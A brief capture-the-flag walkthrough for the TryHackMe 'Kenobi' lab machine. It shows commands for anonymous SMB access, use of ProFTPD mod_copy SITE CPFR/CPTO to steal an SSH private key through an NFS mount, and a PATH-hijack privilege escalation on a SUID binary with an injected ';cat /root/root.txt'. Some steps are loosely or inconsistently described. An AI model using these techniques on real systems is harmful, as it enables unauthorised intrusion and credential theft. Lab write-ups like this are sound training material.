# TryHackMe Kenobi Room

IP=`10.10.148.26`

Ports: #7
```
21:ftp
22:ssh
80:http
111:rpcbind
139:smbd
445:smbd
2049:nfs_acl
```

Used Kali Box to access the smbclient as anonymous (no password needed)
`smbclient //10.10.148.26/anonymous`
then to get the only file there: log.txt
`exit`
`smbget -R smb://10.10.148.26/anonymous`

From the log we can see kenobi has stored their ssh keys in 
`/home/kenobi/.ssh/id_rsa`

Then we use
`nmap -p 111 10.10.148.26 --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs -oN nmap/rpc_nfs_enum`
to enumerate the smbd server

logon to the ftp server
`netcat 10.10.148.26 21`
Notice that the server is a proftpd server v.1.3.5
used a simple ftp server exploit to copy files from one area to another
`SITE CPFR /home/kenobi/.ssh/id_rsa`
`SITE CPTO /var/tmp/id_rsa`
Then we mount /var as it is available from the smb server
`sudo mount_nfs -o resvport 10.10.148.26:/var mnt/ken`
Navigate and copy the id_rsa file to our machine
`sudo umount ken` to unmount the drive

Now we login with his ssh private key and look for suid files
I decided to just run linpeas and be lazy
we found: `/usr/bin/menu` which had full perms and therefore exploitable
`echo /bin/bash -p > curl`
`mv curl /tmp`
`menu
1;cat /root/root.txt`
And we got the flag!
